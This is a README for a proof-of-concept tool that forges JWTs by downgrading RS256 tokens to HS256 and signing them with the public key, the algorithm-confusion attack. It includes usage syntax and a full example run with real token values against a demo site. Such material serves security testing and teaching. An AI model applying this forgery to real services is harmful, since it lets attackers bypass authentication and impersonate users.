# JWTconverter
Convert JWT tokens from RS256 to HS256


## Details
For a given RS256 signed JWT token, this script changes the algorithm from RS256 to HS256 and signs the altered token with the public key (that you provide). It is only used as a Proof of Concept do demonstrate a vulnerability, and thus does not change the payload.


## Download via Git
Run this command to clone from Git:
```git clone https://github.com/Logeirs/JWTconverter.git```


## Usage
```
JWTconverter.py {RS256 JWT token} {Public key file}
```


## Example
Example using the following application: http://demo.sjoerdlangkemper.nl/jwtdemo/rs256.php
```
>JWTconverter.py eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJodHRwOlwvXC9kZW1vLnNqb2VyZGxhbmdrZW1wZXIubmxcLyIsImlhdCI6MTU2MjgyMTAyOCwiZXhwIjoxNTYyODIxMTQ4LCJkYXRhIjp7ImhlbGxvIjoid29ybGQifX0.XlgqI4zNlEsjzGBslj-Dee5C2_WLpDSOVdjFXR4FO4TOx4RMth9mGPdIIeTQZbFyiVoQ9jkX0O3czWTr52y8qB7iJOqDKzwBoi1NPD_xoihFKHrnLxOmR1yLyjXwzlIHURRZ7f_DpPuwqnOYRbjSen4cMVBz0UhgGYe4DNcSjxNmaV2Ksfwd2exTC61g22szQIa_ISyJYU0OxIN2_Ad_XsPpmc_AQ0QcxyYCDcCEkByWUD9adCIBWlrdQhsjXASfEuP5olmvI4Znn2L33fSpAOW1G5DqozTQxyctOXvNuNm3ql9DvE5Wqntr5Z-vs6aQj32uKrVMSutayxuExVH_lQ pubkey.pem


[+] data: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOlwvXC9kZW1vLnNqb2VyZGxhbmdrZW1wZXIubmxcLyIsImlhdCI6MTU2MjgyMTAyOCwiZXhwIjoxNTYyODIxMTQ4LCJkYXRhIjp7ImhlbGxvIjoid29ybGQifX0
[+] HMAC: cd44e3c58199ab7d0eafec318f01cfefa1ecba689761e12db1bc9412571c47b2
[+] signature: zUTjxYGZq30Or-wxjwHP76HsumiXYeEtsbyUElccR7I
-----------
[+] new JWT token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOlwvXC9kZW1vLnNqb2VyZGxhbmdrZW1wZXIubmxcLyIsImlhdCI6MTU2MjgyMTAyOCwiZXhwIjoxNTYyODIxMTQ4LCJkYXRhIjp7ImhlbGxvIjoid29ybGQifX0.zUTjxYGZq30Or-wxjwHP76HsumiXYeEtsbyUElccR7I
```
